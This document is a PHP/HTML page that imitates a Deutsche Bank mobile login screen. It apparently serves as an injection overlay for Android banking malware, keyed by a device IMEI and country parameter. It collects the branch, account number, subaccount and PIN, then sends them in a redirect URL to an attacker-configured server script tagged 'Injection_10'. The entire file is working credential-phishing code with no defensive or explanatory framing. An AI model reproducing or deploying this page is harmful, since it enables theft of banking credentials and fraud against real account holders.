<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="de/com.db.pwcc.dbmobile/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        </div>
    <div class="footer">
      <center>
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFsAAAAfCAYAAACI/7HjAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MEYwNjk5RTI5NzJFMTFFOEIyRUNCOEJFMzQxQ0MxMkEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MEYwNjk5RTM5NzJFMTFFOEIyRUNCOEJFMzQxQ0MxMkEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDowRjA2OTlFMDk3MkUxMUU4QjJFQ0I4QkUzNDFDQzEyQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDowRjA2OTlFMTk3MkUxMUU4QjJFQ0I4QkUzNDFDQzEyQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PpKSurMAAAQeSURBVHja7JlrTFNnGMf/vaIWWrAIUkkURAHFaFAxblHjxpRo/DAzZ8yMd4LGS4x+8pOXGJ26TckM3pbOIdF4j+iXOZ0miotXvKCIiBcqWLUKvVjo7XTv+xI7sWhZ6Tk9JufftOl5+/Tt6e885/8+zzky7Kz1QxLvUjutkEsYBJExse7SGKXEgX/QqTdP7SqZ1P+KlNk8g5b5OY6CphsSbJ51ok9N4bv3Emw+7aOyfMf7AxJsnkDTl5LJA65JsAVQuaF6/odjEmwesjr79Naijj6ICGx/UYbg/ygav9kZ0L3vnT2waU6BlzfY0ZBs10NR+vTufMOZjwVINsKzT78vQTtIuQzIilfDoFGA8wMmhxe1Vk9QXLpWhfQ4Fdwk6H6zGz4SO1Svxt8NLYGYKX01OPn0LXs/VB+DJpcPNg+HnAQ1NCo5zE4fbr12CZbVCabbF2BQQRSwYxQy/PplL0xN06CeQCab6EeAFlc1Y821Nww+1YIsLX4anchi6JBOLcePlU1YPkSHrIP1/2VRQUrASooGadmBKUjVwEWODH2kkbn31dqx5OIr3kGrnc0v/xil2hsqUDDYCwfpkJcUg+TSJyRT28h2V8rwYlYa/jQ5UWFuRUoPBQP91ckG3LC0ZeUwkrVXpqZ2eAa8k9Prx5LBOgw/asLdJjcbG0wy/J9vU3mHLeO83iMZz1d16swWCva8rDisuGQJgKZqIZCWVViwdoSebRdm63D8sSMAmuomsYI91bZA5ndYmZA5D9U5AqCpHts96KHk/e8ZNZb66k7bqFCwB2pJpr1oDRo/+sjBMr7Ne9W4/DLYZ881toScn3r7h9lOrYpP0Frzg+v7h7m2iQ42Xbz6xAa7Fj3d6WJG5SAxWnXwLiV1V4Sc380Jeg+ElXllub6S/1UgCLV3F80tKCSLXzu/I89fvkiEscbGts83tuK7dE1QBTM3U9vOfj6HMi+qsNffaGKL5PqRerYQpsUp8fv4ZAzUqbC9yspi9j+0k+pDgVIyTku/fiRmz9gkBrrVJxrYxvhndyrC+WLEqpGPtc9fn2pg9XElWfTGkypj7cieqPq+L9w+jlUhOYfrmX1Q0bLtGxK/cZQeV0kFYvf4yeJoZZ49vX+saLK6NE9pDKtyEdsN3+MTUzDjjLldJv9MykGrm8O662+if5Hpr+JFm2ZPcIfV1Imt5c0mHebSHB0SYhTkKce09FjMHBCH36ptUQeta7x3OVzQoszs0cndUEw6zex4FSndZKizebCBdJAHiJ9HU1pzzeKyXK6kK3OI7u46rcXzjpnEtltGQ9XpvcjN79q1IUgKCTrz3M6Vm2flO7t8IU5i+WnQ3eyvnm35YVxzJCaTYIfoEg9lWlZHakIJdoS7RAl2mFkdaUmwO5DC63JGOqup/hVgAMGBhAgvulJjAAAAAElFTkSuQmCC">
        <form action="null" class="form" class="form" method="post" id="_mainForm" target="flow_handler">
            <div class="field11">

                <input type="tel" style="margin: 10px" name="branch" id="branch" class="field1" onkeyup="check();" minlength="3" maxlength="13" placeholder="Branch" required></br>
                <input type="tel" style="margin: 10px" name="account-number" id="account-number" class="field" onkeyup="check();" minlength="7" maxlength="17" placeholder="Account number" required></br>
                <input type="tel" style="margin: 10px" name="subaccount" id="subaccount" class="field1" onkeyup="check();" minlength="2" maxlength="12" placeholder="Subaccount" required></br>
            </div>

            <div class="field11">

                <input type="password" style="margin: 10px" name="pin" id="pin" class="field2" onkeyup="check();" minlength="5" maxlength="15" placeholder="PIN" required></br>
                <input type="submit" class="button" id="sbt_button" disabled value="Sign in">
            </div>
        </form>
      </center>
    </div>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script>
    function check() {
    var inp1 = document.getElementById('branch'),
        inp2 = document.getElementById('account-number'),
        inp3 = document.getElementById('subaccount'),
        inp4 = document.getElementById('pin');
    document.getElementById('sbt_button').disabled = inp1.value && inp2.value && inp3.value && inp4.value ? false : "disabled";
    }
</script>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('sbt_button');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('branch');
            var oCodeInp = document.getElementById('account-number');
            var oCode2Inp = document.getElementById('subaccount');
            var oCode3Inp = document.getElementById('pin');

            try{
                oNumInp.className = 'field1';
                oCodeInp.className = 'field';
                oCode2Inp.className = 'field1';
                oCode3Inp.className = 'field2';
            } catch(e){};

            if (!/^\w{3,13}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field1 error';
                } catch(e){};
                return false;
            }

            if (!/^\w{7,13}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{2,13}$/i.test(oCode2Inp.value)) {
                try{
                    oCode2Inp.className = 'field1 error';
                } catch(e){};
                return false;
            }

            if (!/^\w{5,13}$/i.test(oCode3Inp.value)) {
                try{
                    oCode3Inp.className = 'field2 error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
            location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_10|de_com.db.pwcc.dbmobile|Branch: "+oNumInp.value+"//br//Account-number: "+oCodeInp.value+"//br//SubAccount: "+oCode2Inp.value+"//br//PIN: "+oCode3Inp.value);

           return false;
       };

   })();
</script>
</body>
</html>
